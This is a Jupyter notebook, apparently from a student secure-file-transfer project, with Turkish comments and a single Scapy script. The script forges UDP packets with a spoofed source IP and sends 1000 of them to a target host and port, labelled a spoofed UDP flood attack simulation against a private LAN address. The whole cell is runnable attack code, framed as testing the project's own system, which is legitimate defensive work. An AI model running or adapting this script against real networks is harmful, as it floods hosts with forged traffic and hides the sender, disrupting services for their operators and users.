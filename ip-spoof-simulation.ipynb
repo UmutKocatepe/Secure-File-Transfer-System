{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9a5338f-52d8-47be-a154-86a2a8fffbd8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# ip-spoof-simulation.py #Bu spoofed UDP saldırı testi farklı bir cihazdan veya sanal makineden yapılmal\n",
    "from scapy.all import IP, UDP, send\n",
    "\n",
    "# Sahte (spoofed) IP adresi\n",
    "source_ip = \"192.168.1.100\"  # sahte IP\n",
    "target_ip = \"192.168.1.10\"   # hedef IP (Bu saldırı simulasyonu için local değil gerçek bir target-ip gerekir)\n",
    "\n",
    "# IP header elle ayarla\n",
    "ip_layer = IP(src=source_ip, dst=target_ip)\n",
    "\n",
    "# UDP header ayarla\n",
    "udp_layer = UDP(sport=12345, dport=5555)\n",
    "\n",
    "# Veri kısmı\n",
    "data = \"Spoofed UDP Flood Attack\".encode()\n",
    "\n",
    "# Paket oluştur\n",
    "packet = ip_layer / udp_layer / data\n",
    "\n",
    "# Paketi çok sayıda gönder (ör. 1000 kere)\n",
    "for i in range(1000):\n",
    "    send(packet, verbose=0)  # verbose=0 → her gönderimde mesaj yazmasın\n",
    "\n",
    "print(\"Spoofed UDP paketleri gönderildi.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
